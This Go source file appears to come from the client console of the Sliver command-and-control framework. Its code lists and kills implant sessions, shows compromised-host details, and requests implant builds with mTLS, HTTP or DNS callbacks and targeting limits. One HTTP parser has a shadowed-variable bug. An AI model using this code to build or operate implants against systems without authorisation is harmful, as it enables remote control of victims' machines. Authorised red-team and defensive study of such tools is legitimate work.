package command

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"log"
	"net/url"
	"os"
	"path/filepath"
	consts "sliver/client/constants"
	"sliver/client/spin"
	clientpb "sliver/protobuf/client"
	sliverpb "sliver/protobuf/sliver"
	"sort"
	"strings"
	"text/tabwriter"
	"time"

	"github.com/desertbit/grumble"
	"github.com/golang/protobuf/proto"
)

func sessions(ctx *grumble.Context, rpc RPCServer) {
	resp := <-rpc(&sliverpb.Envelope{
		Type: clientpb.MsgSessions,
		Data: []byte{},
	}, defaultTimeout)
	if resp.Err != "" {
		fmt.Printf(Warn+"Error: %s\n", resp.Err)
		return
	}
	sessions := &clientpb.Sessions{}
	proto.Unmarshal(resp.Data, sessions)

	slivers := map[uint32]*clientpb.Sliver{}
	for _, sliver := range sessions.Slivers {
		slivers[sliver.ID] = sliver
	}
	if 0 < len(slivers) {
		printSlivers(slivers)
	} else {
		fmt.Printf(Info + "No slivers connected\n")
	}
}

/*
	So this method is a little more complex than you'd maybe think,
	this is because Go's tabwriter aligns columns by counting bytes
	and since we want to modify the color of the active sliver row
	the number of bytes per row won't line up. So we render the table
	into a buffer and note which row the active sliver is in. Then we
	write each line to the term and insert the ANSI codes just before
	we display the row.
*/
func printSlivers(sessions map[uint32]*clientpb.Sliver) {
	outputBuf := bytes.NewBufferString("")
	table := tabwriter.NewWriter(outputBuf, 0, 2, 2, ' ', 0)

	// Column Headers
	fmt.Fprintln(table, "ID\tName\tTransport\tRemote Address\tUsername\tOperating System\t")
	fmt.Fprintf(table, "%s\t%s\t%s\t%s\t%s\t%s\t\n",
		strings.Repeat("=", len("ID")),
		strings.Repeat("=", len("Name")),
		strings.Repeat("=", len("Transport")),
		strings.Repeat("=", len("Remote Address")),
		strings.Repeat("=", len("Username")),
		strings.Repeat("=", len("Operating System")))

	// Sort the keys becuase maps have a randomized order
	var keys []int
	for _, sliver := range sessions {
		keys = append(keys, int(sliver.ID))
	}
	sort.Ints(keys) // Fucking Go can't sort int32's, so we convert to/from int's

	activeIndex := -1
	for index, key := range keys {
		sliver := sessions[uint32(key)]
		if ActiveSliver.Sliver != nil && ActiveSliver.Sliver.ID == sliver.ID {
			activeIndex = index + 2 // Two lines for the headers
		}
		fmt.Fprintf(table, "%d\t%s\t%s\t%s\t%s\t%s\t\n",
			sliver.ID, sliver.Name, sliver.Transport, sliver.RemoteAddress, sliver.Username,
			fmt.Sprintf("%s/%s", sliver.OS, sliver.Arch))
	}
	table.Flush()

	if activeIndex != -1 {
		lines := strings.Split(outputBuf.String(), "\n")
		for lineNumber, line := range lines {
			if len(line) == 0 {
				continue
			}
			if lineNumber == activeIndex {
				fmt.Printf("%s%s%s\n", green, line, normal)
			} else {
				fmt.Printf("%s\n", line)
			}
		}
	} else {
		fmt.Printf(outputBuf.String())
	}
}

func use(ctx *grumble.Context, rpc RPCServer) {
	if len(ctx.Args) == 0 {
		fmt.Printf(Warn + "Missing sliver name or session number, see `help use`\n")
		return
	}
	sliver := getSliver(ctx.Args[0], rpc)
	if sliver != nil {
		ActiveSliver.SetActiveSliver(sliver)
		fmt.Printf(Info+"Active sliver %s (%d)\n", sliver.Name, sliver.ID)
	} else {
		fmt.Printf(Warn+"Invalid sliver name or session number '%s'\n", ctx.Args[0])
	}
}

func background(ctx *grumble.Context, rpc RPCServer) {
	ActiveSliver.SetActiveSliver(nil)
	fmt.Printf(Info + "Background ...\n")
}

func kill(ctx *grumble.Context, rpc RPCServer) {
	if ActiveSliver.Sliver == nil {
		fmt.Printf(Warn + "Please select an active sliver via `use`\n")
		return
	}

	sliver := ActiveSliver.Sliver
	data, _ := proto.Marshal(&sliverpb.KillReq{
		SliverID: sliver.ID,
	})
	resp := <-rpc(&sliverpb.Envelope{
		Type: sliverpb.MsgKill,
		Data: data,
	}, defaultTimeout)

	if resp.Err != "" {
		fmt.Printf(Warn+"%s\n", resp.Err)
	} else {
		fmt.Printf(Info+"Killed %s (%d)\n", sliver.Name, sliver.ID)
	}
}

func info(ctx *grumble.Context, rpc RPCServer) {

	var sliver *clientpb.Sliver
	if ActiveSliver.Sliver != nil {
		sliver = ActiveSliver.Sliver
	} else if 0 < len(ctx.Args) {
		sliver = getSliver(ctx.Args[0], rpc)
	}

	if sliver != nil {
		fmt.Printf(bold+"            ID: %s%d\n", normal, sliver.ID)
		fmt.Printf(bold+"          Name: %s%s\n", normal, sliver.Name)
		fmt.Printf(bold+"      Hostname: %s%s\n", normal, sliver.Hostname)
		fmt.Printf(bold+"      Username: %s%s\n", normal, sliver.Username)
		fmt.Printf(bold+"           UID: %s%s\n", normal, sliver.UID)
		fmt.Printf(bold+"           GID: %s%s\n", normal, sliver.GID)
		fmt.Printf(bold+"           PID: %s%d\n", normal, sliver.PID)
		fmt.Printf(bold+"            OS: %s%s\n", normal, sliver.OS)
		fmt.Printf(bold+"          Arch: %s%s\n", normal, sliver.Arch)
		fmt.Printf(bold+"Remote Address: %s%s\n", normal, sliver.RemoteAddress)
	} else {
		fmt.Printf(Warn+"No target sliver, see `help %s`\n", consts.InfoStr)
	}
}

func generate(ctx *grumble.Context, rpc RPCServer) {
	config := parseCompileFlags(ctx)
	if config == nil {
		return
	}
	save := ctx.Flags.String("save")
	if save == "" {
		save, _ = os.Getwd()
	}
	compile(config, save, rpc)
}

// Shared function that extracts the compile flags from the grumble context
func parseCompileFlags(ctx *grumble.Context) *clientpb.SliverConfig {
	targetOS := strings.ToLower(ctx.Flags.String("os"))
	arch := strings.ToLower(ctx.Flags.String("arch"))

	debug := ctx.Flags.Bool("debug")

	c2s := []*clientpb.SliverC2{}

	mtlsC2 := parseMTLSc2(ctx.Flags.String("mtls"))
	c2s = append(c2s, mtlsC2...)

	httpC2 := parseHTTPc2(ctx.Flags.String("http"))
	c2s = append(c2s, httpC2...)

	dnsC2 := parseDNSc2(ctx.Flags.String("dns"))
	c2s = append(c2s, dnsC2...)

	if len(mtlsC2) == 0 && len(httpC2) == 0 && len(dnsC2) == 0 {
		fmt.Printf(Warn + "Must specify at least on of --mtls, --http, or --dns\n")
		return nil
	}

	reconnectInverval := ctx.Flags.Int("reconnect")
	maxConnectionErrors := ctx.Flags.Int("max-errors")

	limitDomainJoined := ctx.Flags.Bool("limit-domainjoined")
	limitHostname := ctx.Flags.String("limit-hostname")
	limitUsername := ctx.Flags.String("limit-username")
	limitDatetime := ctx.Flags.String("limit-datetime")

	isSharedLib := ctx.Flags.Bool("shared")

	/* For UX we convert some synonymous terms */
	if targetOS == "mac" || targetOS == "macos" || targetOS == "m" {
		targetOS = "darwin"
	}
	if targetOS == "win" || targetOS == "w" || targetOS == "shit" {
		targetOS = "windows"
	}
	if targetOS == "unix" || targetOS == "l" {
		targetOS = "linux"
	}
	if arch == "x64" || strings.HasPrefix(arch, "64") {
		arch = "amd64"
	}
	if arch == "x86" || strings.HasPrefix(arch, "32") {
		arch = "386"
	}

	config := &clientpb.SliverConfig{
		GOOS:   targetOS,
		GOARCH: arch,
		Debug:  debug,
		C2:     c2s,

		ReconnectInterval:   uint32(reconnectInverval),
		MaxConnectionErrors: uint32(maxConnectionErrors),

		LimitDomainJoined: limitDomainJoined,
		LimitHostname:     limitHostname,
		LimitUsername:     limitUsername,
		LimitDatetime:     limitDatetime,

		IsSharedLib: isSharedLib,
	}

	return config
}

func parseMTLSc2(args string) []*clientpb.SliverC2 {
	c2s := []*clientpb.SliverC2{}
	if args == "" {
		return c2s
	}
	for index, arg := range strings.Split(args, ",") {
		uri := url.URL{Scheme: "mtls"}
		uri.Host = arg
		if uri.Port() == "" {
			uri.Host = fmt.Sprintf("%s:%d", uri.Host, defaultMTLSLPort)
		}
		c2s = append(c2s, &clientpb.SliverC2{
			Priority: uint32(index),
			URL:      uri.String(),
		})
	}
	return c2s
}

func parseHTTPc2(args string) []*clientpb.SliverC2 {
	c2s := []*clientpb.SliverC2{}
	if args == "" {
		return c2s
	}
	for index, arg := range strings.Split(args, ",") {
		arg = strings.ToLower(arg)
		var uri *url.URL
		var err error
		if strings.HasPrefix(arg, "http://") || strings.HasPrefix(arg, "https://") {
			uri, err = url.Parse(arg)
			if err != nil {
				log.Printf("Failed to parse c2 URL %v", err)
				continue
			}
		} else {
			uri := &url.URL{Scheme: "https"} // HTTPS is the default, will fallback to HTTP
			uri.Host = arg
		}
		c2s = append(c2s, &clientpb.SliverC2{
			Priority: uint32(index),
			URL:      uri.String(),
		})
	}
	return c2s
}

func parseDNSc2(args string) []*clientpb.SliverC2 {
	c2s := []*clientpb.SliverC2{}
	if args == "" {
		return c2s
	}
	for index, arg := range strings.Split(args, ",") {
		uri := url.URL{Scheme: "dns"}
		if len(arg) < 1 {
			continue
		}
		// Make sure we have the FQDN
		if !strings.HasSuffix(arg, ".") {
			arg += "."
		}
		if strings.HasPrefix(arg, ".") {
			arg = arg[1:]
		}

		uri.Host = arg
		c2s = append(c2s, &clientpb.SliverC2{
			Priority: uint32(index),
			URL:      uri.String(),
		})
	}
	return c2s
}

func profileGenerate(ctx *grumble.Context, rpc RPCServer) {
	name := ctx.Flags.String("name")
	if name == "" && 1 <= len(ctx.Args) {
		name = ctx.Args[0]
	}
	save := ctx.Flags.String("save")
	if save == "" {
		save, _ = os.Getwd()
	}
	profiles := getSliverProfiles(rpc)
	if profile, ok := (*profiles)[name]; ok {
		compile(profile.Config, save, rpc)
	} else {
		fmt.Printf(Warn+"No profile with name '%s'", name)
	}
}

func compile(config *clientpb.SliverConfig, save string, rpc RPCServer) {

	fmt.Printf(Info+"Generating new %s/%s sliver binary \n", config.GOOS, config.GOARCH)
	ctrl := make(chan bool)
	go spin.Until("Compiling ...", ctrl)

	generateReq, _ := proto.Marshal(&clientpb.GenerateReq{Config: config})
	resp := <-rpc(&sliverpb.Envelope{
		Type: clientpb.MsgGenerate,
		Data: generateReq,
	}, 1200*time.Second) // TODO: make timeout a parameter
	ctrl <- true
	if resp.Err != "" {
		fmt.Printf(Warn+"%s\n", resp.Err)
		return
	}

	generated := &clientpb.Generate{}
	proto.Unmarshal(resp.Data, generated)

	saveTo, _ := filepath.Abs(save)
	fi, err := os.Stat(saveTo)
	if err != nil {
		fmt.Printf(Warn+"Failed to generate sliver %v\n", err)
		return
	}
	if fi.IsDir() {
		saveTo = filepath.Join(saveTo, generated.File.Name)
	}
	err = ioutil.WriteFile(saveTo, generated.File.Data, os.ModePerm)
	if err != nil {
		fmt.Printf(Warn+"Failed to write to: %s\n", saveTo)
		return
	}
	fmt.Printf(Info+"Sliver binary saved to: %s\n", saveTo)
}

func profiles(ctx *grumble.Context, rpc RPCServer) {
	profiles := getSliverProfiles(rpc)
	if profiles == nil {
		return
	}
	if len(*profiles) == 0 {
		fmt.Printf(Info+"No profiles, create one with `%s`\n", consts.NewProfileStr)
		return
	}
	table := tabwriter.NewWriter(os.Stdout, 0, 2, 2, ' ', 0)
	fmt.Fprintf(table, "Name\tPlatform\tDebug\tLimitations\t\n")
	fmt.Fprintf(table, "%s\t%s\t%s\t%s\t\n",
		strings.Repeat("=", len("Name")),
		strings.Repeat("=", len("Platform")),

		// C2

		strings.Repeat("=", len("Debug")),
		strings.Repeat("=", len("Limitations")))
	for name, profile := range *profiles {
		config := profile.Config
		fmt.Fprintf(table, "%s\t%s\t%s\t\n",
			name,

			// C2

			fmt.Sprintf("%v", config.Debug),
			getLimitsString(config),
		)
	}
	table.Flush()
}

func getLimitsString(config *clientpb.SliverConfig) string {
	limits := []string{}
	if config.LimitDatetime != "" {
		limits = append(limits, fmt.Sprintf("datetime=%s", config.LimitDatetime))
	}
	if config.LimitDomainJoined {
		limits = append(limits, fmt.Sprintf("domainjoined=%v", config.LimitDomainJoined))
	}
	if config.LimitUsername != "" {
		limits = append(limits, fmt.Sprintf("username=%s", config.LimitUsername))
	}
	if config.LimitHostname != "" {
		limits = append(limits, fmt.Sprintf("hostname=%s", config.LimitHostname))
	}
	return strings.Join(limits, "; ")
}

func newProfile(ctx *grumble.Context, rpc RPCServer) {
	name := ctx.Flags.String("name")
	if name == "" {
		fmt.Printf(Warn + "Invalid profile name\n")
		return
	}

	config := parseCompileFlags(ctx)
	if config == nil {
		return
	}

	data, _ := proto.Marshal(&clientpb.Profile{
		Name:   name,
		Config: config,
	})

	resp := <-rpc(&sliverpb.Envelope{
		Type: clientpb.MsgNewProfile,
		Data: data,
	}, defaultTimeout)
	if resp.Err != "" {
		fmt.Printf(Warn+"%s\n", resp.Err)
	} else {
		fmt.Printf(Info + "Saved new profile\n")
	}
}

func getSliverProfiles(rpc RPCServer) *map[string]*clientpb.Profile {
	resp := <-rpc(&sliverpb.Envelope{
		Type: clientpb.MsgProfiles,
	}, defaultTimeout)
	if resp.Err != "" {
		fmt.Printf(Warn+"%s\n", resp.Err)
		return nil
	}

	pbProfiles := &clientpb.Profiles{}
	err := proto.Unmarshal(resp.Data, pbProfiles)
	if err != nil {
		fmt.Printf(Warn+"Error %s", err)
		return nil
	}

	profiles := &map[string]*clientpb.Profile{}
	for _, profile := range pbProfiles.List {
		(*profiles)[profile.Name] = profile
	}
	return profiles
}

func ping(ctx *grumble.Context, rpc RPCServer) {
	if ActiveSliver.Sliver == nil {
		fmt.Printf(Warn + "Please select an active sliver via `use`\n")
		return
	}
}

func getPID(ctx *grumble.Context, rpc RPCServer) {
	if ActiveSliver.Sliver == nil {
		fmt.Printf(Warn + "Please select an active sliver via `use`\n")
		return
	}
	fmt.Printf("%d\n", ActiveSliver.Sliver.PID)
}

func getUID(ctx *grumble.Context, rpc RPCServer) {
	if ActiveSliver.Sliver == nil {
		fmt.Printf(Warn + "Please select an active sliver via `use`\n")
		return
	}
	fmt.Printf("%s\n", ActiveSliver.Sliver.UID)
}

func getGID(ctx *grumble.Context, rpc RPCServer) {
	if ActiveSliver.Sliver == nil {
		fmt.Printf(Warn + "Please select an active sliver via `use`\n")
		return
	}
	fmt.Printf("%s\n", ActiveSliver.Sliver.GID)
}

func whoami(ctx *grumble.Context, rpc RPCServer) {
	if ActiveSliver.Sliver == nil {
		fmt.Printf(Warn + "Please select an active sliver via `use`\n")
		return
	}
	fmt.Printf("%s\n", ActiveSliver.Sliver.Username)
}
